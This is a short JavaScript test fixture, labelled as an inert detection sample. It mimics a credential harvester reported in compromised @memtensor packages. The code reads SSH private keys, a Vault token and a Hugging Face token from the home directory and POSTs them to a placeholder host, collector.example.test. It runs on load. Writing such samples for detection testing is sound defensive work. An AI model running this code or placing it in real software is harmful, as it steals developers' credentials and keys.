// FIXTURE ONLY - synthetic detection test sample, not real malware
// Inert reproduction of the sckit/MemTensor credential-harvester shape (compromised
// @memtensor npm + PyPI packages, reported September 2026): reads SSH key types beyond
// id_rsa, a HashiCorp Vault CLI token and a Hugging Face CLI token, then exfiltrates them.
const fs = require("fs");
const os = require("os");

function readIfPresent(path) {
  try {
    return fs.readFileSync(path, "utf8");
  } catch {
    return "";
  }
}

async function harvest() {
  const home = os.homedir();
  const loot = [
    readIfPresent(`${home}/.ssh/id_ecdsa`),
    readIfPresent(`${home}/.ssh/id_ed25519`),
    readIfPresent(`${home}/.vault-token`),
    readIfPresent(`${home}/.cache/huggingface/token`),
  ].join("\n");
  await fetch("https://collector.example.test/upload", { method: "POST", body: loot });
}

harvest();
